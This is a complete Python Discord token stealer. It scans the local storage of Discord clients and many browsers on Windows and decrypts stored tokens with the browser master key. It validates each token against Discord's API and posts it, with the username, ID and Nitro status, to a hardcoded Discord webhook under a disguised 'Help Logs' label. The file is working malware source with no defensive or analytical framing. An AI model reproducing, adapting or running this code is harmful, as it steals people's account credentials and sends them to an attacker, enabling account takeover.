import base64
import json
import os
import re
import requests
import subprocess
import sys
import time

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

class ExtractTokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        print("Starting extraction process...")
        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        total_paths = len(paths)
        path_count = 0
        
        for name, path in paths.items():
            path_count += 1
            print(f"Checking path {path_count}/{total_paths}: {name}...")
            if not os.path.exists(path): 
                print(f"Path does not exist: {path}")
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): 
                    print(f"Local State file not found for {name}")
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                    
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
                                    print(f"Token found: {token} for user ID {uid}")

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
                                    print(f"Token found: {token} for user ID {uid}")

    def validate_token(self, token: str) -> bool:
        try:
            r = requests.get(self.base_url, headers={'Authorization': token})
            return r.status_code == 200
        except requests.exceptions.RequestException:
            return False
    
    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def get_master_key(self, path: str) -> bytes:
        if not os.path.exists(path): return b''
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return b''
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

class FetchTokens:
    def __init__(self):
        print("Initializing token fetcher...")
        self.tokens = ExtractTokens().tokens
    
    def upload(self, webhook_url, raw_data=False):
        print("Uploading tokens...")
        if not self.tokens:
            print("No tokens found.")
            return
        final_to_return = []
        for token in self.tokens:
            try:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                username = user['username']
                user_id = user['id']
                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
                nitro = 'None' if user['premium_type'] == 0 else ('Nitro Classic' if user['premium_type'] == 1 else 'Nitro')
                
                # Add relevant emojis
                nitro_emoji = "🎮" if nitro != 'None' else "🚫"
                avatar_emoji = "🖼️"
                
                # Create a clean, professional message using markdown and emojis
                content = f"**🚨 Log for {username} 🚨**\n\n" \
                          f"**User ID:** `{user_id}`\n" \
                          f"**NS:** {nitro_emoji} {nitro}\n" \
                          f"**Avatar:** {avatar_emoji} [Click here]({avatar})\n\n" \
                          f"**Log Number:** `{token}`\n\n" \

                # This part simulates the outline or card-like appearance
                embed = {
                    "title": f"🔑 Token Details for {username}",
                    "description": content,
                    "color": 16711680,  # Red (Discord-like color for highlights)
                    "footer": {"text": "Help Logs"}
                }

                # Format message data with user's avatar as the webhook avatar
                data = {
                    'content': None,  # No main content since we have an embed
                    'embeds': [embed],
                    'username': username,
                    'user_id': user_id,
                    'token': token,
                    'avatar': avatar,
                    'nitro': nitro
                }

                # Debugging: Print the data being sent
                print(f"Preparing to send data: {json.dumps(data, indent=4)}")

                if not raw_data:
                    # Send the formatted message to the webhook
                    response = requests.post(webhook_url, json=data)
                    print(f"Response Status Code: {response.status_code}, Response Text: {response.text}")

                final_to_return.append(data)
            except Exception as e:
                print(f"Error processing token: {e}")
        
        return final_to_return


if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5"
    fetcher = FetchTokens()
    fetcher.upload(webhook_url)
